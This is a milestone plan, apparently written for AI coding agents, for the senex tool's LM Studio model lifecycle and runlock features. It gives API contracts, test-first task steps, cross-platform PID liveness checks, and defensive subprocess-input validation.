# Milestone 4: Lifecycle + Runlock Integration

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development. Each task uses checkbox (`- [ ]`) syntax for tracking. Sequential within this milestone; check Prerequisites before starting.

## Context

M4 delivers model lifecycle management: deciding whether to load a model, attaching to an already-loaded one, holding a runlock so a second senex run won't unload it, and unloading only when *we* loaded it AND no one else holds the lock. It also delivers the `senex lifecycle` CLI subcommand for operator visibility.

**Architectural intent:** The runlock from M1 is the *mechanism*; the Lifecycle wrapper is the *policy*. The policy must work correctly when (a) we are the only senex run, (b) two runs share a model, (c) a run resumes from checkpoint and inherits a model it didn't load, (d) the model fingerprint changes mid-run. Each scenario has a unique combination of `loaded_by_us` provenance + runlock holder count + auto_unload setting; getting any one wrong corrupts the lock file or leaves models pinned in VRAM.

## Prerequisites

- **Completed milestones:** M1 Foundation, M2 Walker + Graph Awareness, M3 LM Studio Integration
- **Required modules from prior work:**
  - `senex/runlock.py` — `RunLock.acquire()` / `release()` (M1 Task 1.6); M4 Task 4.0 hardens the contract before any Lifecycle code touches it
  - `senex/events.py` — all 11 lifecycle event types: `ModelLoadRequested/Started/Complete/Failed`, `ModelUnloadStarted/Complete/Skipped/Failed`, `ModelFingerprintChanged`, `RunLockAcquired/Released` (M1 Task 1.3)
  - `senex/lmstudio_client.py` — `list_loaded_models()` for backend probing (M3 Task 3.8)
  - `senex/config.py` — `LifecycleCfg` (`auto_load`, `auto_unload`, `allow_mixed`, `load_timeout_seconds`, `runlock_dir`) (M1 Task 1.2)
  - `senex/secret_redactor.py` — used to redact `model_id` paths in error messages before logging (M1 Task 1.4)
- **Required tools/state:**
  - LM Studio running locally for `senex lifecycle status` smoke tests (deferred to M10 live gates; M4 unit tests use mocks)
  - Either `lmstudio` Python SDK installed OR `lms` CLI on PATH (backend selection auto-detects; both absent is a covered test case)
  - Python 3.11+ (`asyncio.TaskGroup`, `tomllib`, structural `match`)
  - `portalocker>=2.7` already in pyproject from M1
  - On Windows: `ctypes` stdlib (used by `_is_pid_alive` Windows branch)

## Deliverable

This milestone creates the following files:

- `senex/lmstudio_lifecycle.py` — `LifecycleBackend` protocol, `LMStudioSDKBackend`, `LMSCLIBackend`, `Lifecycle` high-level API, `validate_model_id()` helper, lifecycle exception hierarchy
- `senex/runlock.py` — **hardened** by Task 4.0 (the M1 stub becomes the production contract used by Lifecycle)
- `tests/unit/test_lifecycle.py` — backend selection + acquire/release scenarios + resume table + threat-surface validation + concurrency
- `tests/unit/test_runlock_concurrency.py` — multi-thread acquire/release + corrupt-JSON recovery + cross-platform PID liveness
- Wired-in CLI subcommands: `senex lifecycle status [--json]`, `senex lifecycle clear-locks [--force]` (the argparse shell lives in M10; here we add the handler functions and register the subparser)
- Wired-in `senex doctor` lifecycle availability check (returns a `DoctorCheck` row; integrated into `senex.phases.preflight.PreflightPhase` in M10)

## Downstream consumers

- **M8** Auditor calls `lifecycle.acquire(model_id, run_id, runlock, auto_load)` at run start and `lifecycle.release(...)` at run end. The `loaded_by_us` boolean from acquire is persisted on `checkpoint.json.lifecycle_provenance` for resume.
- **M8** Resume path calls `lifecycle.acquire_for_resume(...)` instead of regular `acquire()`; the result `loaded_by_us` is **always** False (see §5.5.2.7 step 4).
- **M10** CLI subcommands `senex lifecycle status` and `senex lifecycle clear-locks` are exposed in the argparse layer (`senex/cli.py`).
- **M10** Doctor incorporates the lifecycle backend availability check (`PreflightPhase` row "lmstudio_lifecycle_backend").

## Spec sections referenced

- §5.5.2 Model Lifecycle Management — overall lifecycle behavior
- §5.5.2.1 Acquire/Release semantics — the canonical algorithm (referenced by Task 4.2)
- §5.5.2.2 Runlock format — already implemented in M1; M4 hardens it (Task 4.0) and consumes it
- §5.5.2.3 Implementation backends + fingerprint computation — backend selection + canonical fingerprint (`sha256(model_id|quant|checkpoint_digest)`)
- §5.5.2.4 Failure modes table — every row maps to a test in the spec §9 lifecycle list
- §5.5.2.5 Events — the 11 lifecycle event types and their schema
- §5.5.2.6 Threat surface — subprocess injection, lockfile poisoning, fingerprint substitution
- §5.5.2.7 Resume integration — 4-row scenario table; `loaded_by_us=False` invariant on resume
- §SEC-4 — `model_id` regex validation pre-subprocess (`^[A-Za-z0-9_./-]+$`)
- §11.1 threat model rows: subprocess injection via `model_id`, lockfile poisoning, fingerprint substitution
- §10 CLI — `senex lifecycle status [--json]` and `senex lifecycle clear-locks [--force]` shapes
- §8.1 Pre-flight — doctor row for lifecycle backend availability
- §9 test list rows 29-35 — lifecycle test coverage requirements (35 rows total; rows 29-35 are M4-owned)

## Conventions cross-references (this brief follows them)

| Concern | Convention | Where applied in M4 |
|---|---|---|
| All I/O is async | Spec §3 architecture (auditor is pure async coroutine) | `Lifecycle.acquire/release/acquire_for_resume` are `async def`; backend protocol methods are `async def` |
| Subprocess hardening | Spec §SEC-4 / §5.5.2.6 / §11.1 | Every `lms` invocation: list-form, `shell=False`, `validate_model_id()` BEFORE constructing argv |
| Atomic file writes | Spec §3 architecture (write+fsync+rename) | `RunLock` writes go through `_atomic_write_json()`; corrupt files renamed with timestamp |
| Pydantic v2 strict | Spec §API-3 / M11 | `LifecycleCfg` already strict in M1; `ModelInfo` here is `pydantic.BaseModel` with `model_config = ConfigDict(extra="forbid")` |
| Event seq monotonic per run | Spec §5.6 | All 11 lifecycle events emitted via `bus.publish()`; never construct `seq` manually |
| TDD throughout | Spec §9 testing strategy | Every task starts with a failing test before implementation |
| Pre-commit graph scope check | Project CLAUDE.md (GitNexus mandatory) | Each task ends with `gitnexus_detect_changes` before `git commit` |

## Key contracts (signatures are LOAD-BEARING — downstream M8 wires to these)

```python
# Exceptions (senex/lmstudio_lifecycle.py)
class LifecycleError(Exception): ...
class LifecycleBackendUnavailable(LifecycleError): ...
class ModelLoadTimeout(LifecycleError): ...
class ModelLoadFailed(LifecycleError): ...
class ModelNotLoaded(LifecycleError): ...
class InvalidModelId(LifecycleError, ValueError): ...
class FingerprintMismatch(LifecycleError): ...
class ResumedRunCannotOwnLoad(LifecycleError): ...   # raised if resume code path tries to set loaded_by_us=True

# Exceptions (senex/runlock.py, hardened in Task 4.0)
class RunLockError(Exception): ...
class RunLockCorrupt(RunLockError): ...              # raised + auto-renamed-then-recreated

# Backend protocol
from typing import Protocol
from pydantic import BaseModel, ConfigDict

class ModelInfo(BaseModel):
    model_config = ConfigDict(extra="forbid")
    model_id: str
    quant: str
    checkpoint_digest: str    # sha256 hex; "unknown" sentinel allowed (§5.5.2.3)
    fingerprint: str          # sha256(json([model_id, quant, checkpoint_digest])).hexdigest()
    backend: str              # "sdk" | "cli" — whichever produced this info

class LifecycleBackend(Protocol):
    async def is_loaded(self, model_id: str) -> bool: ...
    async def load(self, model_id: str, timeout: int) -> ModelInfo: ...
    async def unload(self, model_id: str) -> None: ...
    async def list_loaded(self) -> list[ModelInfo]: ...

# Backend selection
class LifecycleBackendFactory:
    @staticmethod
    async def select() -> LifecycleBackend:
        """Try SDK first, then CLI; raise LifecycleBackendUnavailable if neither."""

# RunLock hardened contract (Task 4.0)
class RunLock:
    @classmethod
    def acquire(
        cls,
        fingerprint: str,
        run_id: str,
        pid: int,
        loaded_by_us: bool,
        *,
        root: Path | None = None,    # default ~/.senex/locks
    ) -> int:
        """Returns current holder count after this run is appended.
        Atomic: portalocker advisory lock held over read -> prune-dead-PIDs -> append -> tmp-write -> fsync -> rename."""

    @classmethod
    def release(cls, fingerprint: str, run_id: str, *, root: Path | None = None) -> int:
        """Returns remaining holder count after this run is removed.
        Same atomicity envelope as acquire()."""

    @classmethod
    def list_holders(cls, fingerprint: str, *, root: Path | None = None) -> list[dict]:
        """Read-only; for `senex lifecycle status`. Holds the advisory lock for the read."""

    @classmethod
    def clear(cls, fingerprint: str, *, force: bool = False, root: Path | None = None) -> int:
        """Prune dead-PID holders; with force=True, remove all holders. Returns removed count."""

# Lifecycle high-level API
class Lifecycle:
    def __init__(self, backend: LifecycleBackend, bus: EventBus, config: LifecycleCfg, redactor: SecretRedactor): ...

    async def acquire(
        self,
        model_id: str,
        run_id: str,
        runlock: type[RunLock],
        *,
        auto_load: bool,
    ) -> tuple[ModelInfo, bool]:
        """Returns (info, loaded_by_us).
        - not loaded + auto_load=True  -> load -> acquire(loaded_by_us=True)  -> (info, True)
        - not loaded + auto_load=False -> raise ModelNotLoaded (BEFORE any runlock touch)
        - already loaded               -> probe info -> acquire(loaded_by_us=False) -> (info, False)"""

    async def release(
        self,
        model_id: str,
        run_id: str,
        runlock: type[RunLock],
        *,
        auto_unload: bool,
        loaded_by_us: bool,
        resumed: bool = False,
    ) -> None:
        """count = runlock.release(); if count==0 AND loaded_by_us AND auto_unload AND NOT resumed:
        unload + emit ModelUnloadComplete. Else: emit ModelUnloadSkipped(reason=<concrete enum string>)."""

    async def acquire_for_resume(
        self,
        model_id: str,
        run_id: str,
        runlock: type[RunLock],
        *,
        checkpoint_fingerprint: str,
        allow_mixed: bool,
    ) -> ModelInfo:
        """Always acquires loaded_by_us=False regardless of probe outcome (§5.5.2.7 step 4).
        Fingerprint mismatch + not allow_mixed -> raise FingerprintMismatch BEFORE acquire."""

# Doctor integration (Task 4.5)
async def doctor_check_lifecycle_backend(config: SenexConfig) -> DoctorCheck:
    """Returns DoctorCheck(name="lmstudio_lifecycle_backend", status="pass"|"warn"|"fail", message=...).
    Status is 'fail' ONLY if auto_load=true AND no backend; 'warn' if no backend but auto_load=false; else 'pass'."""

# CLI handlers (Task 4.4)
async def cli_lifecycle_status(*, as_json: bool) -> int: ...     # exit code
async def cli_lifecycle_clear_locks(*, force: bool) -> int: ...
```

**`ModelUnloadSkipped.reason` enum (load-bearing across M4/M8/M10):** exactly one of:
- `"concurrent_holders"` — count > 0 after release
- `"not_loaded_by_us"` — count == 0 but we_loaded == False
- `"auto_unload_disabled"` — count == 0 AND we_loaded but auto_unload == False
- `"resumed_run_does_not_own_load"` — resume path always emits this on release

**`senex lifecycle status --json` schema (PINNED — test asserts byte-shape):**
```json
{
  "version": 1,
  "loaded_models": [
    {"model_id": "google/gemma-4-26b-a4b", "quant": "Q5_K_M", "fingerprint": "sha256:abc...", "backend": "sdk"}
  ],
  "runlock_holders": [
    {"fingerprint": "sha256:abc...", "run_id": "01HQ...", "pid": 12345, "started_at": "2026-04-26T12:00:00Z", "loaded_by_us": true, "pid_alive": true}
  ]
}
```

## Watch-outs

- **Resume MUST NEVER set `loaded_by_us=True`** (§5.5.2.7 step 4). A resumed run did not perform the original load; even if the fingerprint matches, the model belongs to whoever loaded it originally. `loaded_by_us=False` is unconditional on `acquire_for_resume`. If the model was unloaded externally and resume re-loads it, the user-visible re-load is a side effect for liveness — but the runlock holder for THIS resumed run still records `loaded_by_us=False` because the spec wants the crashed run's original ownership to remain dead. `auto_unload` is forced to `False` for the resumed run on release (emit `ModelUnloadSkipped(reason="resumed_run_does_not_own_load")`).
- **Refcount semantics:** `release()` returns the count *after* this run's holder is removed. Unload only when `count == 0 AND loaded_by_us AND auto_unload`. Any other combination → emit `ModelUnloadSkipped(reason=...)` with the exact enum string above (no free-form reasons).
- **Fingerprint mismatch on resume** is a hard error unless `allow_mixed=True`. Raise `FingerprintMismatch` BEFORE calling `runlock.acquire()` so a refused resume doesn't poison the lock with a holder that will never release.
- **`model_id` is subprocess input.** Validate `^[A-Za-z0-9_./-]+$` pre-subprocess in *both* SDK and CLI backends (defense in depth — some SDK adapters call `subprocess` underneath). Failed validation → raise `InvalidModelId` before any external call.
- **CLI backend uses list-form args.** Never `f"lms load {model_id}"`. Always `["lms", "load", model_id]`. `shell=False` is the default but pass it explicitly for grep-ability. CLI backend uses `asyncio.create_subprocess_exec` (NOT `subprocess.run`) per spec §3 async architecture.
- **`is_loaded()` is racy.** Two senex runs can both observe "not loaded" and both call `load()`. The runlock protects the unload side; the load side relies on LM Studio's idempotent load (subsequent loads return immediately if already loaded). Both runs end up holding the lock; only the second's `loaded_by_us` is logically False *unless* we cannot tell, in which case treat both as `loaded_by_us=True` and rely on refcount to gate unload (the worst case is a delayed unload, never a wrongful one).
- **All 11 lifecycle events are emitted from `Lifecycle`, never the backends.** Backends are mechanism-only. Mixing event emission into the backend means SDK and CLI emit different event sequences, and that breaks `events.jsonl` invariants.
- **`portalocker` advisory lock spans the entire read+modify+write window.** Acquiring the file lock, then releasing it before the rename, leaves a window where another process can read pre-write state. The lock is released only after `os.replace()` completes.
- **Cross-platform PID liveness:** POSIX `os.kill(pid, 0)` raises `ProcessLookupError` for dead PIDs and `PermissionError` for live-but-not-ours. Both mean "alive enough to count" — only `ProcessLookupError` is a dead PID. On Windows, `ctypes.windll.kernel32.OpenProcess(SYNCHRONIZE=0x00100000, False, pid)` returns `0` for dead PIDs; non-zero handle means alive (call `CloseHandle` after).
- **`ModelInfo.fingerprint` is computed once at probe time.** Never recompute fingerprint inside `acquire()` — the value is set on `ModelInfo` by the backend's `load()` or `list_loaded()` and is immutable for that probe.
- **`auto_unload=False` on the run-completion path still emits `ModelUnloadSkipped`** for observability (§5.5.2.5). Silent skip would lose the operator's signal that the model is intentionally pinned.

## Patterns to follow

- **§5.5.2.1 acquire/release pseudocode is the canonical algorithm.** Implement it byte-for-byte:
  ```
  acquire:
    if not is_loaded(model_id):
        if auto_load: load -> runlock.acquire(loaded_by_us=True) -> return (info, True)
        else: raise ModelNotLoaded
    else:
        info = probe -> runlock.acquire(loaded_by_us=False) -> return (info, False)

  release:
    count = runlock.release(fp, run_id)
    if count == 0 and we_loaded and auto_unload and not resumed:
        unload -> emit ModelUnloadComplete
    else:
        emit ModelUnloadSkipped(reason=<enum>)
  ```
- **Test the §5.5.2.7 resume table row-by-row** — 4 scenarios, 4 separate tests.
- **Test the §5.5.2.4 failure-modes table row-by-row** — 7 scenarios, 7 separate tests.
- **All 11 lifecycle events emitted from `Lifecycle`**, never from the backends. The backends are mechanism-only.
- **Mock subprocess at the `asyncio.create_subprocess_exec` boundary** for CLI backend; mock `lmstudio.list_loaded_models` for SDK backend.
- **Atomic file writes:** every `RunLock` write uses tmp+rename+fsync, gated by the advisory lock.
- **Pydantic v2** for `ModelInfo` (`extra="forbid"`); raise on unknown fields from the backend.

## Tasks

### Task 4.0: RunLock production hardening (consumed by all later tasks)

> M1 Task 1.6 shipped a stub. M4 Task 4.0 hardens it against concurrency, corruption, and cross-platform PID liveness *before* any Lifecycle code touches it. Do not skip this task — `Lifecycle.acquire/release` cannot be correct on top of a non-atomic runlock.

**Files:**
- Modify: `senex/runlock.py`
- Create: `tests/unit/test_runlock_concurrency.py`

- [ ] **Step 4.0.1: Failing test `test_concurrent_acquire_release_no_lost_holder`** — spawn two `threading.Thread`s; each calls `RunLock.acquire(fp, run_id_i, os.getpid(), True)` then `RunLock.release(fp, run_id_i)` 100 times; assert final holder count is 0 and lockfile is deleted. Use a shared `tmp_path` fixture.

- [ ] **Step 4.0.2: Failing test `test_corrupt_json_recovers`**:
  ```python
  def test_corrupt_json_recovers(tmp_path):
      lock_path = tmp_path / "abc.lock"
      lock_path.write_text("{not valid json", encoding="utf-8")
      count = RunLock.acquire("abc", "run-1", os.getpid(), loaded_by_us=True, root=tmp_path)
      assert count == 1
      # Corrupt file was renamed with timestamp suffix:
      corrupted = list(tmp_path.glob("abc.lock.corrupt-*"))
      assert len(corrupted) == 1
      assert lock_path.exists()  # recreated cleanly
  ```

- [ ] **Step 4.0.3: Failing test `test_pid_liveness_posix_branch`** — `monkeypatch.setattr("sys.platform", "linux")`; mock `os.kill` to raise `ProcessLookupError(3)` for pid 99999; assert `RunLock._is_pid_alive(99999) is False`; mock `os.kill` to return None for `os.getpid()`; assert `True`. Mock `PermissionError` → assert `True` (alive but not ours).

- [ ] **Step 4.0.4: Failing test `test_pid_liveness_windows_branch`** — `monkeypatch.setattr("sys.platform", "win32")`; mock `ctypes.windll.kernel32.OpenProcess` returning `0`; assert `_is_pid_alive(99999) is False`; mock returning `1234`; assert `True` AND assert `CloseHandle` was called with `1234`.

- [ ] **Step 4.0.5: Implement `_is_pid_alive(pid: int) -> bool`** with `match sys.platform: case "win32": ...` branch; use `ctypes.WinDLL("kernel32")` (cached at module import). Document why each platform branch behaves as it does.

- [ ] **Step 4.0.6: Implement `RunLock.acquire/release`** with the full atomicity envelope: hold a `portalocker.Lock` advisory lock on a sibling `.guard` file across read → prune dead PIDs → modify holders → tmp-write → fsync → `os.replace(tmp, lock_path)`. Implement `_atomic_write_json(path, data)` helper. On `JSONDecodeError`, rename to `<path>.corrupt-<unix_ts>` and treat as fresh.

- [ ] **Step 4.0.7: Implement `list_holders()` and `clear()`** — `list_holders` reads under the advisory lock; `clear(force=False)` prunes only dead PIDs and returns removed count; `clear(force=True)` empties all holders (with a `warnings.warn` on each live PID removed).

- [ ] **Step 4.0.8: Verify** with the literal command and expected output:
  ```
  $ pytest tests/unit/test_runlock_concurrency.py -v
  tests/unit/test_runlock_concurrency.py::test_concurrent_acquire_release_no_lost_holder PASSED
  tests/unit/test_runlock_concurrency.py::test_corrupt_json_recovers PASSED
  tests/unit/test_runlock_concurrency.py::test_pid_liveness_posix_branch PASSED
  tests/unit/test_runlock_concurrency.py::test_pid_liveness_windows_branch PASSED
  ============== 4 passed in <X>s ==============
  ```

- [ ] **Step 4.0.9: Pre-commit scope check** — `gitnexus_detect_changes({scope:"staged"})`; expect changes only under `senex/runlock.py` and `tests/unit/test_runlock_concurrency.py`. Then commit `feat(M4): runlock production hardening (atomicity, corruption recovery, cross-platform PID liveness)`.

### Task 4.1: Lifecycle backend selection

**Files:**
- Create: `senex/lmstudio_lifecycle.py`
- Create: `tests/unit/test_lifecycle.py`

- [ ] **Step 4.1.1: Failing test `test_select_prefers_sdk`**:
  ```python
  async def test_select_prefers_sdk(monkeypatch):
      mock_sdk = MagicMock()
      mock_sdk.list_loaded_models = AsyncMock(return_value=[])
      monkeypatch.setitem(sys.modules, "lmstudio", mock_sdk)
      backend = await LifecycleBackendFactory.select()
      assert isinstance(backend, LMStudioSDKBackend)
  ```

- [ ] **Step 4.1.2: Failing test `test_select_falls_back_to_cli`**:
  ```python
  async def test_select_falls_back_to_cli(monkeypatch):
      monkeypatch.setitem(sys.modules, "lmstudio", None)  # forces ImportError on next import
      monkeypatch.setattr("shutil.which", lambda name: "/usr/local/bin/lms" if name == "lms" else None)
      backend = await LifecycleBackendFactory.select()
      assert isinstance(backend, LMSCLIBackend)
  ```

- [ ] **Step 4.1.3: Failing test `test_select_raises_when_neither_available`**:
  ```python
  async def test_select_raises_when_neither_available(monkeypatch):
      monkeypatch.setitem(sys.modules, "lmstudio", None)
      monkeypatch.setattr("shutil.which", lambda name: None)
      with pytest.raises(LifecycleBackendUnavailable, match="neither lmstudio Python SDK nor lms CLI"):
          await LifecycleBackendFactory.select()
  ```

- [ ] **Step 4.1.4: Failing test `test_select_falls_back_when_sdk_unreachable`** — SDK importable but `list_loaded_models()` raises `ConnectionError`; CLI on PATH; `select()` returns `LMSCLIBackend` (not SDK).

- [ ] **Step 4.1.5: Implement** `LifecycleBackend` Protocol, `ModelInfo` pydantic model, `LMStudioSDKBackend`, `LMSCLIBackend`, `LifecycleBackendFactory.select()`. SDK backend uses `lmstudio.list_loaded_models()`, `lmstudio.llm(model_id)`, `model.unload()`. CLI backend uses `asyncio.create_subprocess_exec("lms", verb, ...)` (NEVER `subprocess.run` — must be async per spec §3 architecture).

- [ ] **Step 4.1.6: Implement `_compute_fingerprint(model_id, quant, checkpoint_digest) -> str`** in the module: `sha256(json.dumps([model_id, quant, checkpoint_digest], separators=(",",":")).encode()).hexdigest()` — both backends call this so the test in Task 4.1.7 holds.

- [ ] **Step 4.1.7: Failing test `test_both_backends_produce_same_fingerprint`** (spec §9 row 34) — given identical mocked `(model_id, quant, checkpoint_digest)` triples from each backend, assert `info_sdk.fingerprint == info_cli.fingerprint`.

- [ ] **Step 4.1.8: Verify** with literal command and expected output:
  ```
  $ pytest tests/unit/test_lifecycle.py -k "select or both_backends" -v
  ============== 5 passed in <X>s ==============
  ```

- [ ] **Step 4.1.9: Commit** `feat(M4): lifecycle backend selection (SDK + CLI) with shared fingerprint`.

### Task 4.2: Lifecycle high-level API (acquire/release)

**Files:**
- Modify: `senex/lmstudio_lifecycle.py`
- Modify: `tests/unit/test_lifecycle.py`

- [ ] **Step 4.2.1: Failing test `test_acquire_loads_when_auto_load_true`**:
  ```python
  async def test_acquire_loads_when_auto_load_true(mock_backend, mock_bus, tmp_path):
      mock_backend.is_loaded = AsyncMock(return_value=False)
      mock_backend.load = AsyncMock(return_value=ModelInfo(
          model_id="m", quant="Q5", checkpoint_digest="abc", fingerprint="fp1", backend="sdk"))
      lifecycle = Lifecycle(mock_backend, mock_bus, LifecycleCfg(auto_load=True), redactor)
      info, loaded_by_us = await lifecycle.acquire("m", "run-1", RunLock, auto_load=True)
      assert loaded_by_us is True
      assert info.fingerprint == "fp1"
      mock_backend.load.assert_awaited_once_with("m", timeout=120)
      # Events: ModelLoadRequested -> ModelLoadStarted -> ModelLoadComplete -> RunLockAcquired
      assert [e.type for e in mock_bus.published] == [
          "ModelLoadRequested", "ModelLoadStarted", "ModelLoadComplete", "RunLockAcquired"]
  ```

- [ ] **Step 4.2.2: Failing test `test_acquire_raises_model_not_loaded_when_auto_load_false`** — model not loaded, `auto_load=False`; assert `ModelNotLoaded` raised AND `RunLock.acquire` was NEVER called (mock + `assert_not_called()`).

- [ ] **Step 4.2.3: Failing test `test_acquire_attaches_when_already_loaded`** — `is_loaded=True`; assert `loaded_by_us is False`, `backend.load` not called, `RunLockAcquired` event emitted with `loaded_by_us=false` field.

- [ ] **Step 4.2.4: Failing test `test_release_unloads_when_count_zero_and_we_loaded_and_auto_unload`** — `runlock.release` returns 0; `loaded_by_us=True`; `auto_unload=True`; assert `backend.unload` awaited; events `RunLockReleased -> ModelUnloadStarted -> ModelUnloadComplete`.

- [ ] **Step 4.2.5: Failing test `test_release_skips_unload_when_concurrent_holders`** (spec §9 row 30) — `runlock.release` returns 1; assert `backend.unload` NOT called; assert `ModelUnloadSkipped` emitted with `reason="concurrent_holders"` exactly.

- [ ] **Step 4.2.6: Failing test `test_release_skips_unload_when_not_loaded_by_us`** (spec §9 row 31) — `runlock.release` returns 0; `loaded_by_us=False`; `auto_unload=True`; assert `backend.unload` NOT called; assert `ModelUnloadSkipped(reason="not_loaded_by_us")`.

- [ ] **Step 4.2.7: Failing test `test_release_skips_unload_when_auto_unload_disabled`** — `runlock.release` returns 0; `loaded_by_us=True`; `auto_unload=False`; assert `ModelUnloadSkipped(reason="auto_unload_disabled")`.

- [ ] **Step 4.2.8: Failing test `test_load_timeout_raises_and_does_not_acquire_runlock`** (spec §5.5.2.4 row 1) — `backend.load` raises `asyncio.TimeoutError`; assert `ModelLoadTimeout` raised AND `RunLock.acquire` NEVER called AND `ModelLoadFailed` event emitted with `error_kind="timeout"`.

- [ ] **Step 4.2.9: Failing test `test_load_failure_raises_and_does_not_acquire_runlock`** (spec §5.5.2.4 row 2) — `backend.load` raises `RuntimeError("GPU OOM")`; assert `ModelLoadFailed` raised AND `RunLock.acquire` NEVER called AND `ModelLoadFailed` event emitted with `error_kind="load_failed"`.

- [ ] **Step 4.2.10: Failing test `test_unload_failure_logs_warn_does_not_raise`** (spec §5.5.2.4 row 3) — `backend.unload` raises; assert `Lifecycle.release` returns normally, `ModelUnloadFailed` event emitted, `audit.log` warn line written. Run completion is not failed by unload failure.

- [ ] **Step 4.2.11: Implement `Lifecycle.acquire`** matching §5.5.2.1 verbatim. Implement `Lifecycle.release` matching §5.5.2.1 verbatim. Use `asyncio.wait_for(backend.load(...), timeout=config.load_timeout_seconds)`; catch `asyncio.TimeoutError` → emit `ModelLoadFailed(error_kind="timeout")` → raise `ModelLoadTimeout`.

- [ ] **Step 4.2.12: Verify** with literal command:
  ```
  $ pytest tests/unit/test_lifecycle.py -k "acquire or release" -v
  ============== 10 passed in <X>s ==============
  ```

- [ ] **Step 4.2.13: Commit** `feat(M4): Lifecycle.acquire/release with §5.5.2.4 failure-mode coverage`.

### Task 4.3: Resume integration (§5.5.2.7)

**Files:**
- Modify: `senex/lmstudio_lifecycle.py`
- Modify: `tests/unit/test_lifecycle.py`

- [ ] **Step 4.3.1: Failing test `test_resume_attached_fingerprint_match`** (§5.5.2.7 table row 1) — model still loaded, fingerprint matches checkpoint; assert returned `ModelInfo`, runlock acquired with `loaded_by_us=False`. On release with `auto_unload=True`, assert `ModelUnloadSkipped(reason="resumed_run_does_not_own_load")`.

- [ ] **Step 4.3.2: Failing test `test_resume_external_unload_then_reload_still_not_owned`** (§5.5.2.7 table row 2) — `is_loaded=False`; resume re-probes, calls `load()`; runlock acquires `loaded_by_us=False` UNCONDITIONALLY (NOT True even though we just loaded). On release: `ModelUnloadSkipped(reason="resumed_run_does_not_own_load")`. This is the load-bearing invariant — resume cannot transfer ownership.

- [ ] **Step 4.3.3: Failing test `test_resume_fingerprint_mismatch_refuses`** (§5.5.2.7 table row 3) — `is_loaded=True` but probed fingerprint != checkpoint fingerprint; `allow_mixed=False`; assert `FingerprintMismatch` raised AND `RunLock.acquire` NEVER called.

- [ ] **Step 4.3.4: Failing test `test_resume_fingerprint_mismatch_allow_mixed_proceeds`** — same setup but `allow_mixed=True`; assert acquire succeeds, `loaded_by_us=False`, `ModelFingerprintChanged` event emitted with `expected_fingerprint=<checkpoint>` and `observed_fingerprint=<probed>`.

- [ ] **Step 4.3.5: Failing test `test_resume_two_concurrent_dead_runs_pruned`** (§5.5.2.7 table row 4) — pre-populate runlock file with two dead-PID holders + one matching fingerprint. Call `acquire_for_resume`. Assert dead PIDs pruned; the resumed run's holder is the only live one.

- [ ] **Step 4.3.6: Failing test `test_resume_cannot_set_loaded_by_us_true`** — call internal helper attempting to construct `acquire_for_resume` result with `loaded_by_us=True`; assert `ResumedRunCannotOwnLoad` raised. (Defense-in-depth assertion; the public API never offers a knob to flip this, but the internal helper guards anyway.)

- [ ] **Step 4.3.7: Implement `acquire_for_resume`** (algorithm):
  ```
  validate_model_id(model_id)
  if backend.is_loaded(model_id):
      info = probe_one(model_id)
  else:
      if not config.auto_load: raise ModelNotLoaded
      info = load_with_timeout(model_id)
  if info.fingerprint != checkpoint_fingerprint:
      if not allow_mixed: raise FingerprintMismatch(expected, observed)
      bus.publish(ModelFingerprintChanged(expected, observed))
  runlock.acquire(info.fingerprint, run_id, os.getpid(), loaded_by_us=False)  # ALWAYS False
  bus.publish(RunLockAcquired(...))
  return info
  ```

- [ ] **Step 4.3.8: Implement resume-specific release path** — `release` already takes `loaded_by_us`; resumed runs pass `loaded_by_us=False` AND `resumed=True`. The reason string is `"resumed_run_does_not_own_load"` whenever `resumed=True`.

- [ ] **Step 4.3.9: Verify** with literal command:
  ```
  $ pytest tests/unit/test_lifecycle.py -k "resume" -v
  ============== 6 passed in <X>s ==============
  ```

- [ ] **Step 4.3.10: Commit** `feat(M4): resume lifecycle handshake (§5.5.2.7 4-row table)`.

### Task 4.4: Lifecycle CLI subcommands

**Files:**
- Modify: `senex/lmstudio_lifecycle.py`
- Modify: `senex/cli.py` (subparser stub if M10 hasn't built `cli.py` yet)
- Create: `tests/unit/test_lifecycle_cli.py`

- [ ] **Step 4.4.1: Failing test `test_lifecycle_status_json_schema`**:
  ```python
  async def test_lifecycle_status_json_schema(monkeypatch, tmp_path, capsys):
      # Pre-populate one runlock file with one holder; mock backend with one loaded model.
      ...
      exit_code = await cli_lifecycle_status(as_json=True)
      assert exit_code == 0
      out = json.loads(capsys.readouterr().out)
      assert out == {
          "version": 1,
          "loaded_models": [{"model_id": "m", "quant": "Q5", "fingerprint": "fp1", "backend": "sdk"}],
          "runlock_holders": [{"fingerprint": "fp1", "run_id": "01HQ...", "pid": 12345,
                                "started_at": "2026-04-26T12:00:00Z", "loaded_by_us": True, "pid_alive": True}],
      }
  ```

- [ ] **Step 4.4.2: Failing test `test_lifecycle_status_human_table`** — `as_json=False`; assert stdout contains "MODEL_ID", "QUANT", "FINGERPRINT" headers and the loaded model rows.

- [ ] **Step 4.4.3: Failing test `test_clear_locks_default_prunes_dead_only`** — runlock with one dead-PID holder + one live; `cli_lifecycle_clear_locks(force=False)`; assert dead pruned, live preserved, exit 0, stderr contains "pruned 1 dead-PID entr".

- [ ] **Step 4.4.4: Failing test `test_clear_locks_force_removes_live_with_warning`** — same setup; `force=True`; assert all holders removed, stderr contains "WARNING" for the live PID, exit 0.

- [ ] **Step 4.4.5: Failing test `test_clear_locks_refuses_live_without_force`** — runlock with only live holders; `force=False`; assert NO holders removed, stderr contains "refusing to remove live holders; use --force", exit non-zero.

- [ ] **Step 4.4.6: Implement `cli_lifecycle_status(as_json)`** — calls `backend.list_loaded()`, scans `runlock_dir` for all `*.lock` files, calls `RunLock.list_holders(fp)` for each, augments each holder with `pid_alive` from `RunLock._is_pid_alive`, prints either JSON or human table.

- [ ] **Step 4.4.7: Implement `cli_lifecycle_clear_locks(force)`** — for each lock file, call `RunLock.clear(fp, force=force)`; collect counts; print summary; refuse and exit 2 when `force=False` AND any live holders found.

- [ ] **Step 4.4.8: Implement argparse subparser registration** in `senex/cli.py` (stub if M10 hasn't built `cli.py` yet — register the parser factory function so M10 wires it):
  ```python
  def register_lifecycle_subparser(subparsers):
      lp = subparsers.add_parser("lifecycle", help="Inspect/manage LM Studio model lifecycle state")
      lp_sub = lp.add_subparsers(dest="lifecycle_cmd", required=True)
      status = lp_sub.add_parser("status")
      status.add_argument("--json", action="store_true", dest="as_json")
      clear = lp_sub.add_parser("clear-locks")
      clear.add_argument("--force", action="store_true")
  ```

- [ ] **Step 4.4.9: Verify** with literal command:
  ```
  $ pytest tests/unit/test_lifecycle_cli.py -v
  ============== 5 passed in <X>s ==============
  ```

